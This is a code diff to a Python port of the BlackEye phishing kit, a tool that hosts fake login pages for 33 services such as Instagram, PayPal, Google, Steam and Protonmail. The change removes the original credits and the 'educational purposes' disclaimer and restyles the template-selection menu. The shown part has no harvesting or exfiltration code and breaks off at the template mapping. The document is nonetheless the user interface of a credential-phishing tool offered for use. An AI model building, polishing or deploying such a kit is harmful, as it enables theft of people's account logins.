@@ -1,4 +1,11 @@
-import os, sys, subprocess
+import os
+import sys
+import subprocess
+import time
+import webbrowser
+import argparse
+import json
+from urllib.parse import urlparse
 
 class colors:
     BLACK  = '\33[30m'
@@ -20,40 +27,34 @@ class colors:
     END      = '\33[0m'
 
 try:
-    print(colors.RED + """
-                        BlackEye Python
+    from theme import print_banner
+    print_banner()
 
-Original Shell Program Created By thelinuxchoice
-Link to Original: https://github.com/thelinuxchoice/blackeye
+    from theme import colors, print_colored
 
-Differences:
-    - This is written in Python
-    - Uses Serveo with A Custom Sub-Domain
+    print_colored("\n                       Available Templates\n", colors.PRIMARY, bold=True)
 
-                        :: DISCLAIMER ::
+    template_list = [
+        "[1] Instagram          [2] Facebook            [3] Snapchat",
+        "[4] Twitter            [5] GitHub              [6] Google", 
+        "[7] Spotify            [8] Netflix             [9] PayPal",
+        "[10] Origin            [11] Steam              [12] Yahoo!",
+        "[13] LinkedIn          [14] Protonmail         [15] Wordpress",
+        "[16] Microsoft         [17] IGFollowers        [18] eBay",
+        "[19] Pinterest         [20] CryptoCurrency     [21] Verizon",
+        "[22] DropBox           [23] Adobe ID           [24] Shopify",
+        "[25] FB Messenger      [26] GitLab             [27] Twitch",
+        "[28] MySpace           [29] Badoo              [30] VK",
+        "[31] Yandex            [32] devianART          [33] Custom"
+    ]
 
-I nor the original developers take any responsibility for actions caused
-by using this program. Any misuse or damage caused by BlackEye is on the
-users behalf. Use for EDUCATIONAL PURPOSES!
-    """ + colors.END)
+    for line in template_list:
+        print_colored(line, colors.SECONDARY)
 
-    print(colors.GREEN + """
-                       Availble Templates
-
-[1] Instagram          [2] Facebook            [3] Snapchat
-[4] Twitter            [5] GitHub              [6] Google
-[7] Spotify            [8] Netflix             [9] PayPal
-[10] Origin            [11] Steam              [12] Yahoo!
-[13] LinkedIn          [14] Protonmail         [15] Wordpress
-[16] Microsoft         [17] IGFollowers        [18] eBay
-[19] Pinterest         [20] CryptoCurrency     [21] Verizon
-[22] DropBox           [23] Adobe ID           [24] Shopify
-[25] FB Messenger      [26] GitLab             [27] Twitch
-[28] MySpace           [29] Badoo              [30] VK
-[31] Yandex            [32] devianART          [33] Custom
-
-Please Choose A Number To Host Template:
-    """ + colors.END)
+    print_colored("\nSpecial Commands:", colors.INFO)
+    print_colored("[T] Toggle Dark/Light Mode", colors.ACCENT)
+    print_colored("[Q] Quit Application", colors.ERROR)
+    print_colored("\nPlease Choose A Number To Host Template:", colors.PRIMARY)
     templates = {
     '1': 'instagram',
     '2': 'facebook',
